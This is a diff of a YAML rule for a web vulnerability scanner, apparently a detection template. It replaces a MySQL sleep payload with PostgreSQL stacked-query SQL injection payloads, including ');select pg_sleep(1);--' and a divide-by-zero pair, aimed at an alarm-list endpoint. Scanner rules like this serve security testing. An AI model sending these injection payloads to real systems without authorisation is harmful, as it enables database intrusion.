@@ -1,18 +1,22 @@
 name: SQL
 rules:
-  method: POST #GET|POST
-  path: /vul/sql/less-1 #漏洞路径 /api/geturl/127.0.0.1*
-  originalParam: "{\"code\":200,\"msg\":\"OK\",\"muser\":[{\"name\":\"zhangsan\",\"age\":\"10\",\"phone\":\"11111\",\"email\":\"11111@11.com\"},{\"name\":\"lisi\",\"age\":\"20\",\"phone\":\"22222\",\"email\":\"22222@22.com\"}]}" #原始参数如: id=1&name=songxiaomo
-  vulParam: msg&age #需要扫描的漏洞参数如:id=1&name=songxiaomo /api/geturl/*/* json为msg&age
+  method: GET #GET|POST
+  path: /alarm/index/list #漏洞路径 /api/geturl/127.0.0.1*
+  originalParam: isAllSelected=false&com_obj[0]=between&com_obj[1][0]='a'&com_obj[1][1]='b' #"{\"code\":200,\"msg\":\"OK\",\"muser\":[{\"name\":\"zhangsan\",\"age\":\"10\",\"phone\":\"11111\",\"email\":\"11111@11.com\"},{\"name\":\"lisi\",\"age\":\"20\",\"phone\":\"22222\",\"email\":\"22222@22.com\"}]}" #原始参数如: id=1&name=songxiaomo
+  vulParam: gid=1 #需要扫描的漏洞参数如:id=1&name=songxiaomo /api/geturl/*/* json为msg&age
   header:
-    999999: 123
-    888888: 123
   headerscan : true #true | false
   payloads:
-    - payload: "and sleep(1)"
-      expression: string.contains(body,'Program Files') #sleep()判断是否存在时间延迟|string.contains(body,'Program Files')判断请求体是否存在关键字
-  expressions: true #默认值为true则输出payloads中判断成功所以结果。id=1和第一个payload组合为payload1 若存在多个参数如：id=1&name=songxiaomo 和两个pauload 则id=1与第一个paylaod和为payload1与第二个为pauload2以此类推
-  type: Json #form(OK)|Multi|json|path 后期加入
+    - payload: ");select 1/1;--"
+      expression: string.contains(body,'"reason":"success"')
+    - payload: ");select 1/0;--"
+      expression: string.contains(body,'"reason":"success"')
+    - payload: ");select pg_sleep(1);--"
+      expression: sleep()
+    #- payload: ";SELECT PG_SLEEP(5)--"
+     # expression: string.contains(body,'Program Files') #sleep()判断是否存在时间延迟|string.contains(body,'Program Files')判断请求体是否存在关键字
+  expressions: (payload0==true && payload1 == false) || payload2 #默认值为true则输出payloads中判断成功所以结果。id=1和第一个payload组合为payload1 若存在多个参数如：id=1&name=songxiaomo 和两个pauload 则id=1与第一个paylaod和为payload1与第二个为pauload2以此类推
+  type: form #form(OK)|Multi|json|path 后期加入
 detail:
   author: songweizheng
   links:
